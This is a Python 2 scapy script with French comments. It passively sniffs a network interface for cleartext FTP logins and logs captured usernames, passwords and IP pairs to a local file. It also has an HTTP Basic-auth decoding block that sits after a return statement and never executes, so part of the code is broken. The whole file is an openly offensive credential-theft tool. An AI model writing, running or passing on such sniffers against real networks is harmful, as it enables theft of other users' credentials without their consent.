#!/usr/bin/python

from scapy.all import *
#on pass en argument le nom de l'interface sur la quelle ecouter
interface = sys.argv[1]

usernames=[' VIDE ']
passwords=[' VIDE']

def check_login(pkt, username, password):
    #ici on cherche les paquet avec le code 230 ce qui correspond au code d'une connection valide en ftp.
    if '230'in pkt[Raw].load:
        print 'Connection FTP valide detecte....'
        #on recupere les ip de destination et source et on les affiches
        ip_dest=str(pkt[IP].dst).strip()
        ip_src=str(pkt[IP].src).strip()
        print'\t ' + str(pkt[IP].dst).strip() + ' -> ' + str(pkt[IP].src).strip() + ':'
        print '\t   Login: ' + username
        print '\t   Mot de passe: ' + password + '\n'
        fichier=open("FTP_login.txt","a")
        fichier.write('\n ' + ip_dest + ' -> ' + ip_src + ':')
        fichier.write('\t   Login: ' + username)
        fichier.write('\t   Mot de passe: ' + password + '\n')
        fichier.close()
        
        return
    else:
        return

def check_for_ftp(pkt):
    if pkt.haslayer(TCP) and pkt.haslayer(Raw):
        #ici on regarde si le port destination ou source est celui du ftp c'est a dire 21
        if pkt[TCP].dport == 21 or pkt[TCP].sport == 21:
            return True
        else:
            return False
    else:
        return False

#Cette fonction permet de separer les paquet HTTP des autres
def check_for_http(pkt):
    if pkt.haslayer(TCP) and pkt.haslayer(Raw):
        #Ici on prend que les paquet ayant pour port source ou destination 80 (le port du http)
        if pkt[TCP].dport == 80 or pkt[TCP].sport == 80:
            return True
        else:
            return False
    else:
        return False

    
def check_pkt(pkt):
    if check_for_ftp(pkt):
        pass
    else:
        return
    data = pkt[Raw].load
    #ici on recupere le login en cherchant le champ "USER " qui contient le login 
    if 'USER ' in data:
        usernames.append(data.split('USER ')[1].strip())
    #ici on recupere le mot de passe en cherchant le chanmp "PASS " qui contient le mot de passe
    elif 'PASS ' in data:
        passwords.append(data.split('PASS ')[1].strip())
    else:
        check_login(pkt, usernames[-1], passwords[-1])
    return
 #Si le paquet n'est pas http on sort de la fonction
    if not check_for_http(pkt):
        return
    #On cree une variable qui comporte la partie a chercher dans le packet
    cre = re.compile ('(.|\n|\r)*Authorization: Basic ([^\n\r]*).*')
    #On convertie le packet en chaine de caractere
    string = str (pkt.payload.payload.payload)
    #on regarde si la chaine "cre" est presente dans le packet
    match= cre.match (string)
    #Si la variable match est difference de "vide" alors on decode en base 64 le mot de passe et on l'affiche
    if match != None:
        mdp = binascii.a2b_base64 (match.group (2))
        print ' MDP: ' + mdp
print ' Debut du sniffing sur linterface %s... \n' % interface
sniff(iface=interface, prn=check_pkt, store=0)
